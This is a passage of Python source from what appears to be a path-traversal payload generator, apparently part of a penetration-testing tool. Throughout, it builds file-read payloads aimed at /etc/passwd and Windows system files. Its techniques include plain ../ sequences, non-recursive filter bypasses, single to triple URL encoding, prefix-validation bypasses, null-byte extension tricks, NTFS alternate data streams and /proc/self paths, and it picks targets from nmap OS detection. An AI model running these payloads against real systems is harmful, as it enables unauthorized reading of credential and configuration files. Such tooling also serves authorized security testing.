                        pattern = f"{modified_path}{fake_ext}"
                        variations.append(pattern)
        
        # Generate filename truncation bypass patterns
        # Some systems truncate long paths, which can bypass validation
        long_fake_extensions = [
            '.verylongextensionnamethatmightbetcated',
            '.png' + 'A' * 50,
            '.txt' + 'B' * 100,
        ]
        
        for null_enc in ['%00', '%2500']:  # Main null encodings
            for long_ext in long_fake_extensions:
                pattern = f"{absolute_file}{null_enc}{long_ext}"
                variations.append(pattern)
        
        # Generate Windows-specific null byte bypass patterns
        if absolute_file.startswith('C:') or '\\' in absolute_file:
            # Windows alternate data streams with null byte
            for null_enc in ['%00', '%2500']:
                for fake_ext in test_extensions[:3]:
                    pattern = f"{absolute_file}:{null_enc}:$DATA{fake_ext}"
                    variations.append(pattern)
                    
                    # Pattern with stream name
                    pattern_stream = f"{absolute_file}:stream{null_enc}{fake_ext}"
                    variations.append(pattern_stream)
        
        # Generate Unix-specific null byte bypass patterns  
        if absolute_file.startswith('/'):
            # Unix symbolic link traversal with null byte
            for null_enc in ['%00', '%2500']:
                for fake_ext in test_extensions[:3]:
                    # Pattern targeting common symlink locations
                    pattern = f"/proc/self/root{absolute_file}{null_enc}{fake_ext}"
                    variations.append(pattern)
                    
                    # Pattern with /proc/self/cwd traversal
                    pattern_cwd = f"/proc/self/cwd{absolute_file}{null_enc}{fake_ext}"
                    variations.append(pattern_cwd)
        
        # Filter out duplicates and invalid patterns
        unique_variations = []
        seen = set()
        for var in variations:
            if var not in seen and len(var) > 10:  # Minimum length check
                unique_variations.append(var)
                seen.add(var)
        
        return unique_variations

    def _get_absolute_target_files(
        self, 
        os_type: OSType, 
        specific_file: Optional[str], 
        extra_files: bool
    ) -> List[str]:
        """Get list of absolute path target files based on OS type and settings"""
        target_files = []
        
        # Always include comprehensive absolute path lists for better coverage
        if os_type == OSType.WINDOWS:
            target_files.extend(self.WINDOWS_ABSOLUTE_FILES)
        elif os_type == OSType.UNIX:
            target_files.extend(self.UNIX_ABSOLUTE_FILES)
        else:  # GENERIC
            target_files.extend(self.WINDOWS_ABSOLUTE_FILES)
            target_files.extend(self.UNIX_ABSOLUTE_FILES)

        # If specific file is provided, also include it
        if specific_file:
            # If it's already an absolute path, add as-is
            if specific_file.startswith('/') or specific_file.startswith('C:') or specific_file.startswith('\\'):
                if specific_file not in target_files:
                    target_files.append(specific_file)
            else:
                # Convert relative to absolute based on OS and add
                if os_type == OSType.WINDOWS:
                    abs_file = f'C:\\{specific_file}'
                    if abs_file not in target_files:
                        target_files.append(abs_file)
                elif os_type == OSType.UNIX:
                    abs_file = f'/{specific_file}'
                    if abs_file not in target_files:
                        target_files.append(abs_file)
                else:  # GENERIC - add for both systems
                    win_abs = f'C:\\{specific_file}'
                    unix_abs = f'/{specific_file}'
                    if win_abs not in target_files:
                        target_files.append(win_abs)
                    if unix_abs not in target_files:
                        target_files.append(unix_abs)

        if extra_files:
            # Add absolute versions of extra files
            for extra_file in self.EXTRA_FILES:
                if os_type == OSType.WINDOWS or os_type == OSType.GENERIC:
                    abs_files = [
                        f'C:\\{extra_file}',
                        f'C:\\inetpub\\wwwroot\\{extra_file}'
                    ]
                    for af in abs_files:
                        if af not in target_files:
                            target_files.append(af)
                            
                if os_type == OSType.UNIX or os_type == OSType.GENERIC:
                    abs_files = [
                        f'/{extra_file}',
                        f'/var/www/html/{extra_file}'
                    ]
                    for af in abs_files:
                        if af not in target_files:
                            target_files.append(af)

        return target_files

    @staticmethod
    def detect_os_type(os_detail: str) -> OSType:
        """
        Detect OS type from nmap OS detection string
        
        Args:
            os_detail: OS detail string from nmap
            
        Returns:
            OSType enum value
        """
        if not os_detail:
            return OSType.GENERIC

        os_detail_lower = os_detail.lower()
        
        if any(keyword in os_detail_lower for keyword in ['windows', 'microsoft', 'win']):
            return OSType.WINDOWS
        elif any(keyword in os_detail_lower for keyword in ['linux', 'unix', 'bsd', 'solaris', 'aix']):
            return OSType.UNIX
        else:
            return OSType.GENERIC

    # Method-specific payload generation functions

    def _generate_simple_traversals(
        self,
        os_type: OSType,
        depth: int,
        specific_file: Optional[str],
        extra_files: bool,
        extension: Optional[str],
        bisection_depth: Optional[int]
    ) -> List[str]:
        """Generate basic directory traversal patterns (../../../etc/passwd)"""
        if not self.quiet:
            print("[+] Generating SIMPLE traversal patterns - Basic directory traversal sequences")
        
        # Generate basic patterns only (no special encoding)
        basic_patterns = ["../", "..\\", "./", ".\\"]
        max_depth = bisection_depth if bisection_depth else depth
        min_depth = bisection_depth if bisection_depth else 1
        
        traversal_strings = []
        for pattern in basic_patterns:
            for k in range(min_depth, max_depth + 1):
                traversal_strings.append(pattern * k)
        
        # Get target files
        target_files = self._get_target_files(os_type, specific_file, extra_files)
        
        # Combine with target files
        final_traversals = []
        for traversal in traversal_strings:
            for target_file in target_files:
                # Normalize target file to prevent double slashes/backslashes
                normalized_target = self._normalize_target_file(target_file)
                payload = traversal + normalized_target
                if extension:
                    payload += extension
                final_traversals.append(payload)
        
        if not self.quiet:
            print(f"[+] Simple traversal patterns created: {len(final_traversals)}")
        
        return final_traversals

    def _generate_absolute_path_traversals(
        self,
        os_type: OSType,
        specific_file: Optional[str],
        extra_files: bool,
        extension: Optional[str]
    ) -> List[str]:
        """Generate direct absolute path injection patterns (/etc/passwd)"""
        if not self.quiet:
            print("[+] Generating ABSOLUTE PATH patterns - Direct absolute path injection")
        
        patterns = self._generate_absolute_patterns(os_type, specific_file, extra_files, extension)
        
        if not self.quiet:
            print(f"[+] Absolute path patterns created: {len(patterns)}")
        
        return patterns

    def _generate_non_recursive_traversals(
        self,
        os_type: OSType,
        depth: int,
        specific_file: Optional[str],
        extra_files: bool,
        extension: Optional[str],
        bisection_depth: Optional[int]
    ) -> List[str]:
        """Generate non-recursive filter bypass patterns (....//....//....//etc/passwd)"""
        if not self.quiet:
            print("[+] Generating NON-RECURSIVE bypass patterns - Filter evasion sequences")
        
        max_depth = bisection_depth if bisection_depth else depth
        nonrecursive_traversals = self._generate_nonrecursive_bypass_traversals(max_depth)
        
        # Get target files
        target_files = self._get_target_files(os_type, specific_file, extra_files)
        
        # Combine with target files
        final_traversals = []
        for traversal in nonrecursive_traversals:
            for target_file in target_files:
                # Normalize target file to prevent double slashes/backslashes
                normalized_target = self._normalize_target_file(target_file)
                payload = traversal + normalized_target
                if extension:
                    payload += extension
                final_traversals.append(payload)
        
        if not self.quiet:
            print(f"[+] Non-recursive bypass patterns created: {len(final_traversals)}")
        
        return final_traversals

    def _generate_url_encoding_traversals(
        self,
        os_type: OSType,
        depth: int,
        specific_file: Optional[str],
        extra_files: bool,
        extension: Optional[str],
        bisection_depth: Optional[int]
    ) -> List[str]:
        """Generate multi-level URL encoding bypass patterns (..%252f..%252f..%252fetc/passwd)"""
        if not self.quiet:
            print("[+] Generating URL ENCODING bypass patterns - Multi-level encoding evasion")
        
        # Focus on URL encoded patterns
        encoded_patterns = [
            "%2e%2e%2f",      # Single URL encoding
            "%252e%252e%252f", # Double URL encoding  
            "%25252e%25252e%25252f", # Triple URL encoding
            "%2e%2e%5c",      # Single backslash encoding
            "%252e%252e%255c", # Double backslash encoding
        ]
        
        max_depth = bisection_depth if bisection_depth else depth
        min_depth = bisection_depth if bisection_depth else 1
        
        traversal_strings = []
        for pattern in encoded_patterns:
            for k in range(min_depth, max_depth + 1):
                traversal_strings.append(pattern * k)
        
        # Get target files
        target_files = self._get_target_files(os_type, specific_file, extra_files)
        
        # Combine with target files
        final_traversals = []
        for traversal in traversal_strings:
            for target_file in target_files:
                # Normalize target file to prevent double slashes/backslashes
                normalized_target = self._normalize_target_file(target_file)
                payload = traversal + normalized_target
                if extension:
                    payload += extension
                final_traversals.append(payload)
        
        if not self.quiet:
            print(f"[+] URL encoding bypass patterns created: {len(final_traversals)}")
        
        return final_traversals

    def _generate_path_validation_traversals(
        self,
        os_type: OSType,
        depth: int,
        specific_file: Optional[str],
        extra_files: bool,
        extension: Optional[str]
    ) -> List[str]:
        """Generate path validation bypass patterns (/var/www/images/../../../etc/passwd)"""
        if not self.quiet:
            print("[+] Generating PATH VALIDATION bypass patterns - Legitimate prefix evasion")
        
        patterns = self._generate_path_validation_bypass_patterns(
            os_type, specific_file, extra_files, extension, depth
        )
        
        if not self.quiet:
            print(f"[+] Path validation bypass patterns created: {len(patterns)}")
        
        return patterns

    def _generate_null_byte_traversals(
        self,
        os_type: OSType,
        depth: int,
        specific_file: Optional[str],
        extra_files: bool,
        extension: Optional[str]
    ) -> List[str]:
        """Generate null byte extension bypass patterns (../../../etc/passwd%00.png)"""
        if not self.quiet:
            print("[+] Generating NULL BYTE bypass patterns - File extension validation evasion")
        
        patterns = self._generate_null_byte_bypass_patterns(
            os_type, specific_file, extra_files, extension, depth
        )
        
        if not self.quiet:
            print(f"[+] Null byte bypass patterns created: {len(patterns)}")
        
        return patterns